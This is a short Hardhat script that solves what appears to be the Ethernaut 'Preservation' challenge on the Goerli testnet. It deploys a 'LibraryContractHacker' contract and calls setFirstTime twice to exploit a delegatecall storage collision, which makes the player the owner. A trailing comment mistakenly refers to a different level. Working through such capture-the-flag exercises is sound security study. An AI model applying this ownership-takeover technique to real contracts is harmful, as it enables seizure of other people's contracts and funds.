// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
require('dotenv').config({ path: __dirname + '/.env' });

const { ethers } = require("hardhat");

async function main() {
    [player] = await ethers.getSigners();
    preservation = await ethers.getContractAt("Preservation", process.env.PRESERVATION_ADDRESS);
    hacker = await (await ethers.getContractFactory("LibraryContractHacker")).deploy();
    hacker.deployed();
    await (await preservation.setFirstTime(hacker.address, {gasLimit: 2_000_000})).wait(); //change value of timeZone1Library to hacker.address
    await (await preservation.setFirstTime(player.address, {gasLimit: 2_000_000})).wait();//change value of owner to player.address
    console.log("The owner was changed to", await preservation.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
// run this script after Fallback contract was deployed
// npx hardhat run scripts/deploy.js --network goerli